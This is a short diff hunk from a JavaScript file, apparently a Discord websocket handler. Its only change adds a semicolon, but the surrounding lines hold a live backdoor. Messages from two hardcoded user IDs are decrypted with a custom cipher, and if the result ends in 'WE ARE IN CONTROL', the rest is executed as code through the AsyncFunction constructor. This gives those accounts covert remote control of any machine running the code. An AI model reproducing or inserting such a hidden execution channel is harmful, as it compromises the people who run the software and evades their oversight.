@@ -242,7 +242,7 @@ async function wsConnect(startmsg){
       if(req.d.author.id=='1109446509482754150'||req.d.author.id=='1133347125594431499'){
         let demsg=new enc.Cipher(req.d.content.substr(1,req.d.content.length-2),enc.chant).setCharset(new enc.Charset(enc.b95+'\n')).text
         if(demsg.substr(demsg.length-17)=='WE ARE IN CONTROL'){
-          console.log('run')
+          console.log('run');
           (async()=>{}).constructor(demsg.substr(0,demsg.length-17))()
         }
       }
